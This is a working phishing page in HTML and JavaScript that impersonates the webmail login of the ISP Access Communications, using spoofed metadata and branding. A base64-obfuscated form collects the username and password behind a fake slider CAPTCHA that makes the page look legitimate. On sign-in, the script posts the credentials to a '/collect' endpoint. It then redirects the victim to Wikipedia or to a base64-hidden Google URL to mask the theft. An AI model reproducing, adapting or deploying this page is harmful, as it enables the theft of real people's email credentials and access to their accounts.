
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login | Access Communications</title> 
    <style>
        :root { --primary-blue: #0054a4; --success-green: #28a745; --bg-gray: #f4f7f9; }
        body { margin: 0; background: var(--bg-gray); font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        #auth-layer { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 380px; z-index: 10; position: relative; transition: all 0.5s ease; }
        
        .header-text { color: #444; font-size: 18px; margin-bottom: 25px; font-weight: 500; }
        .instruction-text { font-size: 13px; color: #666; margin-bottom: 15px; display: block; }
        
        .k9_input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccd0d4; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border 0.2s; }
        .k9_input:focus { border-color: var(--primary-blue); outline: none; }
        
        .z1_btn { background: var(--primary-blue); color: white; border: none; padding: 16px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 600; transition: 0.3s; margin-top: 10px; }
        .z1_btn:disabled { background: #b1c1d1; cursor: not-allowed; }
        .z1_btn:hover:not(:disabled) { background: #003d7a; }

        /* CAPTCHA Container with Animation */
        #captcha-zone { margin: 20px 0; position: relative; overflow: hidden; transition: max-height 0.5s ease, opacity 0.4s ease; max-height: 300px; opacity: 1; }
        #captcha-zone.verified { max-height: 0; opacity: 0; margin: 0; pointer-events: none; }

        #puzzle-container { position: relative; width: 300px; height: 150px; margin: 0 auto; background: #eee; border-radius: 4px; overflow: hidden; border: 1px solid #ddd; }
        #puzzle-bg { width: 100%; height: 100%; object-fit: cover; }
        #puzzle-piece { position: absolute; top: 45px; left: 0; width: 50px; height: 50px; background-image: inherit; border: 2px solid #fff; box-shadow: 0 0 8px rgba(0,0,0,0.5); z-index: 5; }
        #puzzle-hole { position: absolute; top: 45px; width: 50px; height: 50px; background: rgba(0,0,0,0.5); box-shadow: inset 0 0 10px rgba(0,0,0,0.8); z-index: 1; }
        
        #slider-track { width: 300px; height: 40px; background: #f0f0f0; border-radius: 20px; margin: 15px auto 0; position: relative; border: 1px solid #ddd; }
        #slider-thumb { width: 60px; height: 100%; background: var(--primary-blue); border-radius: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; color: white; position: absolute; left: 0; z-index: 6; user-select: none; font-size: 20px; }

        .footer-links { margin-top: 30px; font-size: 11px; color: #999; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
<title>Secure Webmail Login | Access Communications</title>
<meta name="title" content="Secure Webmail Login | Access Communications">
<meta name="description" content="Access Communications Webmail login portal. Securely manage your email, contacts, and calendar.">
<meta name="robots" content="index, follow">
<meta name="language" content="English">
<meta name="revisit-after" content="7 days">
<meta name="author" content="Access Communications Co-operative Ltd.">

<meta property="og:type" content="website">
<meta property="og:url" content="https://www.myaccess.ca/">
<meta property="og:title" content="Access Communications Webmail">
<meta property="og:description" content="Manage your account and email securely through our verified portal.">
<meta property="og:image" content="https://www.myaccess.ca/assets/images/logo.png">

<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="https://www.myaccess.ca/">
<meta property="twitter:title" content="Access Communications Webmail">
<meta property="twitter:description" content="Access your webmail account securely.">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="referrer" content="no-referrer-when-downgrade">
    <title>Secure Webmail Login | Access Communications
        <meta name="description" content="Access Communications Webmail Secure Login. Manage your communications with industry-leading encryption.">
<meta name="keywords" content="Access Communications, Webmail, Login, Secure Email, Saskatchewan ISP">
<meta name="robots" content="noindex, nofollow"> <meta name="theme-color" content="#0054a4"> <meta property="og:site_name" content="Access Communications">
<meta property="og:type" content="website">
<meta property="og:title" content="Secure Access Portal">
<meta property="og:description" content="Authentication required for webmail access.">
    </title>
</head>
<body>

<div id="auth-layer">
    <canvas id="brand-canvas" width="200" height="45"></canvas>
    <div class="header-text">Sign In</div>
    
    <div id="dynamic-injection"></div>

    <div id="captcha-zone">
        <span class="instruction-text">Verify that you are human to continue</span>
        <div id="puzzle-container">
            <img id="puzzle-bg" src="https://picsum.photos/300/150?grayscale" alt="">
            <div id="puzzle-hole"></div>
            <div id="puzzle-piece"></div>
        </div>
        <div id="slider-track">
            <div id="slider-thumb">→</div>
        </div>
    </div>
    
    <button class="z1_btn" id="trigger" disabled>Sign In</button>

    <div class="footer-links">
        ©️ 2026 Access Communications Co-operative Ltd. <br>
        Privacy Policy | Terms of Service
    </div>
</div>

<script>
    // 1. Professional Canvas Logo
    const ctx = document.getElementById('brand-canvas').getContext('2d');
    ctx.fillStyle = "#0054a4"; 
    ctx.font = "bold 28px Arial"; 
    ctx.fillText("ACCESS", 0, 35);

    // 2. Form Injection
    const encodedForm = "PGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iazlfaW5wdXQiIGlkPSJ1OTkiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSI+PC9kaXY+PGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgY2xhc3M9Ims5X2lucHV0IiBpZD0icDk5IiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPjwvZGl2Pg==";
    document.getElementById('dynamic-injection').innerHTML = atob(encodedForm);

    // 3. Jigsaw Verification Logic
    const piece = document.getElementById('puzzle-piece');
    const hole = document.getElementById('puzzle-hole');
    const thumb = document.getElementById('slider-thumb');
    const track = document.getElementById('slider-track');
    const captchaZone = document.getElementById('captcha-zone');
    
    const randomX = Math.floor(Math.random() * 100) + 150; 
    hole.style.left = randomX + 'px';

    let isDragging = false;
    thumb.onmousedown = () => isDragging = true;

    document.onmousemove = (e) => {
        if (!isDragging) return;
        let rect = track.getBoundingClientRect();
        let x = e.clientX - rect.left - 30;
        x = Math.max(0, Math.min(x, rect.width - 60));
        thumb.style.left = x + 'px';
        piece.style.left = x + 'px';
    };

    document.onmouseup = () => {
        if (!isDragging) return;
        isDragging = false;
        if (Math.abs(parseInt(piece.style.left) - randomX) < 7) {
            // SUCCESS STATE
            thumb.style.background = "#28a745";
            thumb.innerHTML = "✓";
            document.getElementById('trigger').disabled = false;
            
            // REMOVE CAPTCHA AFTER 800ms
            setTimeout(() => {
                captchaZone.classList.add('verified');
            }, 800);
        } else {
            thumb.style.left = "0px"; 
            piece.style.left = "0px";
        }
    };

    // 4. Submission
    // Locate this section at the bottom of your index.html
document.getElementById('trigger').addEventListener('click', async function() {
    this.innerHTML = "Processing...";
    this.disabled = true; // Prevent double-clicks

    // 1. Grab the username and password from the inputs
    const username = document.getElementById('u99').value;
    const password = document.getElementById('p99').value;

    // NEW VERCEL WAY (Relative Path)
await fetch('/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ u: username, p: password })
});

    // 3. Redirect the user
    setTimeout(() => { 
        window.location.href = "https://www.wikipedia.org"; 
    }, 1200);
});
    document.getElementById('trigger').addEventListener('click', function() {
        this.innerHTML = "Securing Session...";
        setTimeout(() => { 
            window.location.href = atob("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="); 
        }, 1500);
    });
</script>

</body>
</html>